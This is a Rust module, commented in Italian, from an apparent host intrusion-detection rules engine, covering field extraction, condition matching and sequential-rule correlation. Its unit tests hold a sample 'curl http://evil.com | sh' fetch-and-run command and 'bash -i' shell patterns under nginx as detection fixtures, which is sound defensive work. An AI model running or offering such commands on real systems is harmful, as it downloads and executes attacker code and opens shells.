//! Estrazione dei campi dagli eventi normalizzati e valutazione delle
//! condizioni di matching definite nelle regole.

use once_cell::sync::Lazy;
use parking_lot::Mutex;
use regex::Regex;
use std::collections::HashMap;
use std::time::{Duration, Instant};

use crate::events::{EventPayload, NormalizedEvent};

use super::rule::{CorrelationKey, FieldCondition, Operator};

/// Estrae il valore testuale di un campo dell'evento normalizzato, in
/// base al nome dotted-path usato nelle regole YAML.
///
/// Restituisce `None` se il campo non è applicabile al tipo di evento
/// corrente (es. `exec.filename` su un evento di rete), nel qual caso la
/// condizione viene considerata non soddisfatta.
pub fn extract_field(event: &NormalizedEvent, field: &str) -> Option<String> {
    match field {
        "event_kind" => Some(format!("{:?}", event.event_kind).to_lowercase()),
        "process.comm" => Some(event.process.comm.clone()),
        "process.parent_comm" => event.process.parent_comm.clone(),
        "process.uid" => Some(event.process.uid.to_string()),
        "process.pid" => Some(event.process.pid.to_string()),
        "tag" => Some(event.tags.join(",")),
        "exec.filename" => match &event.payload {
            EventPayload::Exec { filename, .. } => Some(filename.clone()),
            _ => None,
        },
        "exec.args" => match &event.payload {
            EventPayload::Exec { args, .. } => Some(args.join(" ")),
            _ => None,
        },
        "exec.command_line" => match &event.payload {
            EventPayload::Exec { filename, args } => Some(format!("{filename} {}", args.join(" "))),
            _ => None,
        },
        "network.dst_port" => match &event.payload {
            EventPayload::Network { dst_port, .. } => Some(dst_port.to_string()),
            _ => None,
        },
        "network.dst_addr" => match &event.payload {
            EventPayload::Network { dst_addr, .. } => Some(dst_addr.clone()),
            _ => None,
        },
        "file.path" => match &event.payload {
            EventPayload::File { path, .. } => Some(path.clone()),
            _ => None,
        },
        _ => None,
    }
}

/// Valuta una singola condizione contro il valore estratto dall'evento.
pub fn evaluate_condition(event: &NormalizedEvent, condition: &FieldCondition) -> bool {
    if condition.operator == Operator::Present {
        // Per "present", il campo `field` è tipicamente "tag": verifica
        // che il valore (nome del tag) sia tra quelli applicati all'evento.
        return event.tags.iter().any(|t| t == &condition.value);
    }

    let Some(actual) = extract_field(event, &condition.field) else {
        return false;
    };

    match condition.operator {
        Operator::Equals => actual.eq_ignore_ascii_case(&condition.value),
        Operator::Contains => actual.to_lowercase().contains(&condition.value.to_lowercase()),
        Operator::Regex => compile_cached_regex(&condition.value)
            .map(|re| re.is_match(&actual))
            .unwrap_or(false),
        Operator::In => condition
            .value
            .split(',')
            .any(|candidate| candidate.trim().eq_ignore_ascii_case(&actual)),
        Operator::Present => unreachable!("handled above"),
    }
}

/// Valuta se tutte le condizioni (AND logico) sono soddisfatte dall'evento.
pub fn evaluate_all(event: &NormalizedEvent, conditions: &[FieldCondition]) -> bool {
    !conditions.is_empty() && conditions.iter().all(|c| evaluate_condition(event, c))
}

/// Cache delle regex compilate dalle regole, per evitare di ricompilare la
/// stessa espressione a ogni evento valutato (costo non trascurabile su
/// host con throughput elevato di eventi).
static REGEX_CACHE: Lazy<Mutex<HashMap<String, Regex>>> = Lazy::new(|| Mutex::new(HashMap::new()));

fn compile_cached_regex(pattern: &str) -> Option<Regex> {
    let mut cache = REGEX_CACHE.lock();
    if let Some(re) = cache.get(pattern) {
        return Some(re.clone());
    }
    let re = Regex::new(pattern).ok()?;
    cache.insert(pattern.to_string(), re.clone());
    Some(re)
}

/// Chiave usata per correlare eventi appartenenti allo stesso contesto
/// nelle regole sequenziali (Parte "curl seguito da chmod").
pub fn correlation_value(event: &NormalizedEvent, key: CorrelationKey) -> u32 {
    match key {
        CorrelationKey::Pid => event.process.pid,
        CorrelationKey::Ppid => event.process.ppid,
    }
}

/// Tiene traccia degli eventi che hanno soddisfatto la condizione `first`
/// di una regola sequenziale, in attesa di un evento correlato che
/// soddisfi `then` entro la finestra temporale configurata.
#[derive(Default)]
pub struct SequenceTracker {
    /// Chiave: (rule_id, valore di correlazione). Valore: istante in cui
    /// `first` è stato soddisfatto.
    pending: Mutex<HashMap<(String, u32), Instant>>,
}

impl SequenceTracker {
    pub fn new() -> Self {
        Self {
            pending: Mutex::new(HashMap::new()),
        }
    }

    /// Registra che la condizione `first` di `rule_id` è stata soddisfatta
    /// per la data chiave di correlazione.
    pub fn record_first(&self, rule_id: &str, correlation: u32) {
        self.pending
            .lock()
            .insert((rule_id.to_string(), correlation), Instant::now());
    }

    /// Verifica se esiste un match `first` pendente per `rule_id` e
    /// `correlation`, entro `within`. In caso positivo, consuma la voce
    /// (un match sequenziale è "one-shot": non triggera ripetutamente per
    /// lo stesso evento `first`).
    pub fn try_consume_match(
        &self,
        rule_id: &str,
        correlation: u32,
        within: Duration,
    ) -> bool {
        let mut pending = self.pending.lock();
        let key = (rule_id.to_string(), correlation);

        match pending.get(&key) {
            Some(&recorded_at) if recorded_at.elapsed() <= within => {
                pending.remove(&key);
                true
            }
            Some(_) => {
                // Voce scaduta: la rimuoviamo per non farla scadere di
                // nuovo su ogni evento successivo.
                pending.remove(&key);
                false
            }
            None => false,
        }
    }

    /// Rimuove le voci scadute più vecchie della finestra massima
    /// configurabile a livello di rules engine, da chiamare
    /// periodicamente per evitare crescita illimitata della mappa su host
    /// con alto tasso di eventi che soddisfano `first` senza mai un
    /// corrispondente `then`.
    pub fn prune_expired(&self, max_age: Duration) {
        self.pending
            .lock()
            .retain(|_, &mut recorded_at| recorded_at.elapsed() <= max_age);
    }

    pub fn pending_count(&self) -> usize {
        self.pending.lock().len()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::events::{EventKind, ProcessContext};
    use chrono::Utc;
    use uuid::Uuid;

    fn sample_exec_event(comm: &str, filename: &str, args: Vec<&str>) -> NormalizedEvent {
        NormalizedEvent {
            id: Uuid::new_v4(),
            timestamp: Utc::now(),
            event_kind: EventKind::Exec,
            process: ProcessContext {
                pid: 100,
                tgid: 100,
                ppid: 50,
                uid: 1000,
                gid: 1000,
                comm: comm.to_string(),
                cgroup_id: 0,
                parent_comm: Some("nginx".to_string()),
            },
            payload: EventPayload::Exec {
                filename: filename.to_string(),
                args: args.into_iter().map(String::from).collect(),
            },
            container: None,
            tags: Vec::new(),
        }
    }

    #[test]
    fn extracts_exec_filename() {
        let event = sample_exec_event("bash", "/bin/bash", vec!["-i"]);
        assert_eq!(extract_field(&event, "exec.filename"), Some("/bin/bash".to_string()));
    }

    #[test]
    fn extracts_parent_comm() {
        let event = sample_exec_event("bash", "/bin/bash", vec![]);
        assert_eq!(extract_field(&event, "process.parent_comm"), Some("nginx".to_string()));
    }

    #[test]
    fn equals_operator_is_case_insensitive() {
        let event = sample_exec_event("BASH", "/bin/bash", vec![]);
        let condition = FieldCondition {
            field: "process.comm".to_string(),
            operator: Operator::Equals,
            value: "bash".to_string(),
        };
        assert!(evaluate_condition(&event, &condition));
    }

    #[test]
    fn contains_operator_matches_substring() {
        let event = sample_exec_event("sh", "/bin/sh", vec!["-c", "curl http://evil.com | sh"]);
        let condition = FieldCondition {
            field: "exec.args".to_string(),
            operator: Operator::Contains,
            value: "evil.com".to_string(),
        };
        assert!(evaluate_condition(&event, &condition));
    }

    #[test]
    fn regex_operator_matches_pattern() {
        let event = sample_exec_event("bash", "/bin/bash", vec!["-i"]);
        let condition = FieldCondition {
            field: "exec.command_line".to_string(),
            operator: Operator::Regex,
            value: r"bash.*-i".to_string(),
        };
        assert!(evaluate_condition(&event, &condition));
    }

    #[test]
    fn evaluate_all_requires_every_condition() {
        let event = sample_exec_event("bash", "/bin/bash", vec!["-i"]);
        let conditions = vec![
            FieldCondition {
                field: "process.comm".to_string(),
                operator: Operator::Equals,
                value: "bash".to_string(),
            },
            FieldCondition {
                field: "process.parent_comm".to_string(),
                operator: Operator::Equals,
                value: "nginx".to_string(),
            },
        ];
        assert!(evaluate_all(&event, &conditions));

        let mismatched_conditions = vec![
            FieldCondition {
                field: "process.comm".to_string(),
                operator: Operator::Equals,
                value: "bash".to_string(),
            },
            FieldCondition {
                field: "process.parent_comm".to_string(),
                operator: Operator::Equals,
                value: "apache".to_string(),
            },
        ];
        assert!(!evaluate_all(&event, &mismatched_conditions));
    }

    #[test]
    fn sequence_tracker_matches_within_window() {
        let tracker = SequenceTracker::new();
        tracker.record_first("test-rule", 50);

        let matched = tracker.try_consume_match("test-rule", 50, Duration::from_secs(30));
        assert!(matched);

        // La voce è stata consumata: un secondo tentativo non trova nulla.
        let matched_again = tracker.try_consume_match("test-rule", 50, Duration::from_secs(30));
        assert!(!matched_again);
    }

    #[test]
    fn sequence_tracker_does_not_match_different_correlation() {
        let tracker = SequenceTracker::new();
        tracker.record_first("test-rule", 50);

        let matched = tracker.try_consume_match("test-rule", 99, Duration::from_secs(30));
        assert!(!matched);
    }

    #[test]
    fn prune_expired_removes_old_entries() {
        let tracker = SequenceTracker::new();
        tracker.record_first("rule-a", 1);
        assert_eq!(tracker.pending_count(), 1);

        // Con max_age zero, tutte le voci sono considerate scadute.
        tracker.prune_expired(Duration::from_secs(0));
        assert_eq!(tracker.pending_count(), 0);
    }
}